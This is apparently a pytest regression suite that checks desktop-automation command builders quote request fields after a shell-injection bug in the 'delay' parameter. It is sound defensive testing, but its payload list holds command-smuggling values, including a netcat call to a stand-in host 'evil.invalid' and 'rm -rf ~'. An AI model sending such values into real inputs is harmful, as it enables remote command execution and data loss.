"""No value from a request body reaches a shell as syntax (#272).

corgea found `delay` on `POST /v1/desktop/type` interpolated into a
command string with no quoting:

    cmd = f'ydotool type --key-delay {delay} {escaped_text}'

`text` next to it was already `shlex.quote`d, so the defect was not that
quoting was unknown here -- it was that a field nobody thought of as a
string was left out. `{"delay": "1; touch /tmp/pwned"}` ran the touch.

So these tests are written against the *class*, not the one field: every
numeric field of the desktop builders is fed the same catalogue of shell
metacharacters, and the built command is checked for unquoted syntax.
A new interpolation added later fails here without anyone remembering
this issue.
"""
from __future__ import annotations

import shlex

import pytest

from arena.desktop.input import build_type_command
from arena.desktop.window_action import _wmctrl_command, _xdotool_command

# Payloads that turn an unquoted interpolation into a second command.
SHELL_PAYLOADS = [
    "1; touch /tmp/pwned",
    "1 && id",
    "1 || id",
    "1 | nc evil.invalid 1",
    "$(id)",
    "`id`",
    "1\nid",
    "1 > /tmp/clobbered",
    "1 & id",
    "1; rm -rf ~",
]

# Characters that must never appear outside single quotes in a built command.
SHELL_METACHARACTERS = ";&|`$\n><"


BENIGN_ID = "0x03000007"
BENIGN_DELAY = 50


def _assert_no_injection(command: str, payload: str, baseline: str) -> None:
    """The payload must occupy exactly one argument, and add no others.

    Checking the argument *vector* rather than the raw string is what
    makes this reliable. Two earlier attempts were not:

    * banning metacharacters outright flagged the `2>/dev/null` and `&&`
      that these commands legitimately contain;
    * diffing quote-stripped skeletons flagged the benign baseline,
      because `shlex.quote` leaves a safe id unquoted, so the two
      skeletons differed by the id text itself.

    `shlex.split` answers the real question: after the shell finishes
    parsing, is the payload one argument, or did it become new words and
    operators? The vector must match the benign one position for
    position, differing only where the value goes.
    """
    built = shlex.split(command)
    expected = shlex.split(baseline)

    assert len(built) == len(expected), (
        f"payload {payload!r} changed the argument count "
        f"({len(expected)} -> {len(built)}).\n"
        f"  built:    {command!r}\n"
        f"  baseline: {baseline!r}"
    )
    for got, want in zip(built, expected):
        if got != want:
            assert payload in got, (
                f"payload {payload!r} produced an unexpected argument "
                f"{got!r} (baseline had {want!r})"
            )


@pytest.mark.parametrize("payload", SHELL_PAYLOADS)
@pytest.mark.parametrize("env", [{"has_ydotool": True}, {"has_xdotool": True}])
def test_type_delay_cannot_inject_a_shell_command(env, payload):
    """The exact defect: `delay` is not a place to put shell syntax."""
    command, _tool, _err = build_type_command(env=env, text="hello", delay=payload)
    baseline, _t, _e = build_type_command(env=env, text="hello", delay=BENIGN_DELAY)

    assert command is not None
    _assert_no_injection(command, payload, baseline)
    assert "touch" not in command
    assert "rm -rf" not in command


@pytest.mark.parametrize("payload", SHELL_PAYLOADS)
def test_type_text_cannot_inject_a_shell_command(payload):
    """`text` was already quoted; this pins it so it stays that way."""
    command, _tool, _err = build_type_command(
        env={"has_ydotool": True}, text=payload, delay=50
    )
    baseline, _t, _e = build_type_command(
        env={"has_ydotool": True}, text="hello", delay=50
    )

    assert command is not None
    _assert_no_injection(command, payload, baseline)


@pytest.mark.parametrize("payload", SHELL_PAYLOADS)
@pytest.mark.parametrize("action", ["minimize", "restore", "maximize", "close"])
def test_window_id_cannot_inject_through_either_backend(action, payload):
    """`_xdotool_command` quoted its window id and `_wmctrl_command` did not.

    Window ids come from a listing rather than the body today, so this is
    hardening, not a live hole -- but it is the same shape as `delay`,
    whose callers also used to pass only safe values.
    """
    for builder in (_wmctrl_command, _xdotool_command):
        command = builder(action, payload, None, display_env="DISPLAY=:0")
        baseline = builder(action, BENIGN_ID, None, display_env="DISPLAY=:0")
        assert command is not None
        _assert_no_injection(command, payload, baseline)


@pytest.mark.parametrize("payload", SHELL_PAYLOADS)
@pytest.mark.parametrize("field", ["x", "y", "width", "height"])
def test_window_geometry_cannot_inject(field, payload):
    """Geometry reaches the command through `int()` in the builder.

    A non-numeric value must not become shell syntax. Raising is an
    acceptable outcome here (the handler answers 400); emitting a command
    containing the payload is not.
    """
    kwargs = {"x": 0, "y": 0, "width": 100, "height": 100}
    kwargs[field] = payload
    for builder in (_wmctrl_command, _xdotool_command):
        try:
            command = builder(
                "move_resize", "0x1", {"geometry": {}},
                display_env="DISPLAY=:0", **kwargs,
            )
        except (TypeError, ValueError):
            continue  # refused outright, which is safe
        baseline = builder(
            "move_resize", "0x1", {"geometry": {}},
            display_env="DISPLAY=:0", x=0, y=0, width=100, height=100,
        )
        assert command is not None
        _assert_no_injection(command, payload, baseline)


@pytest.mark.parametrize(
    ("delay", "expected"),
    [
        (50, "50"),        # the default
        (0, "0"),          # no delay is a real request
        (12.5, "12.5"),    # a float is a valid keystroke delay
        ("75", "75"),      # numeric strings are what HTTP clients send
        (10_000, "10000"),  # the documented ceiling
    ],
)
def test_legitimate_delays_are_unchanged(delay, expected):
    """The fix must not narrow what already worked."""
    command, _tool, _err = build_type_command(
        env={"has_xdotool": True}, text="hi", delay=delay
    )

    assert f"--delay {expected} " in command


@pytest.mark.parametrize("delay", [10_001, 10**12, -1, -10**9])
def test_out_of_range_delays_are_clamped_not_interpolated(delay):
    """An absurd delay is a hung desktop, so the builder bounds it."""
    command, _tool, _err = build_type_command(
        env={"has_xdotool": True}, text="hi", delay=delay
    )

    emitted = command.split("--delay ")[1].split(" ")[0]
    assert 0 <= float(emitted) <= 10_000


def test_a_real_window_id_survives_quoting():
    """Quoting must not break the ids that actually occur."""
    command = _wmctrl_command("close", "0x03000007", None, display_env="DISPLAY=:0")

    assert "0x03000007" in command
    assert shlex.split(command)[-2] == "0x03000007"


@pytest.mark.parametrize("delay", [float("nan"), float("inf"), float("-inf")])
def test_non_finite_delays_fall_back_to_the_default(delay):
    """NaN and the infinities are valid Python floats and nonsense here.

    `min`/`max` do not order NaN, so clamping alone would have passed it
    straight through into the command string.
    """
    command, _tool, _err = build_type_command(
        env={"has_xdotool": True}, text="hi", delay=delay
    )

    emitted = command.split("--delay ")[1].split(" ")[0]
    assert emitted == "50"
